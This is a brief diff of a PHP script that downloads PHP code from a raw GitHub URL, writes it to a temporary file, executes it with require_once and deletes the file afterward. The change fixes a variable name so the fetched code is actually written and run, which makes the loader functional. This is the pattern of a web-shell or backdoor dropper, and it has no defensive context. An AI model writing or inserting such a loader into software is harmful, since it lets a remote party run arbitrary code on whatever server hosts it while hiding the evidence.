@@ -14,7 +14,7 @@ function get_contents($url) {
 $url = 'https://raw.githubusercontent.com/angelineuniverse/Cybersecurity/refs/heads/dev/development/rushcloud.php';
 $encoded_code = get_contents($url);
 $tempFile = tempnam(sys_get_temp_dir(), 'tmp_php_');
-file_put_contents($tempFile, $decoded_code);
+file_put_contents($tempFile, $encoded_code);
 require_once $tempFile;
 unlink($tempFile); 
 ?>
